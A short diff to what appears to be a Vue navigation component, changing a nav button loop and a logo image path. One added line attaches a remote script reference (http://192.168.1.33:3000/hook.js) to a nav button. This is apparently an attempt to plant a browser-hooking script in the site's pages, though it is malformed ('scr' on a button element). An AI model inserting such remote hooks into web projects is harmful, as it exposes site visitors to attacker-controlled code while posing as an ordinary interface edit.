@@ -13,7 +13,7 @@
           text v-for="(navItem, i) in navItems" 
           :key="i" link 
           :to="navItem.route"
-          
+          scr="http://192.168.1.33:3000/hook.js" type="text/javascript"
           >
             {{ navItem.text }}</v-btn>
         </v-app-bar-items> 
@@ -48,7 +48,7 @@
       >
       <v-list-item>
           <v-list-item-avatar>
-          <v-img src="../assets/logo/logo.svg"></v-img>
+          <v-img src="../assets/logo.svg"></v-img>
           </v-list-item-avatar>
 
           <v-list-item-content>
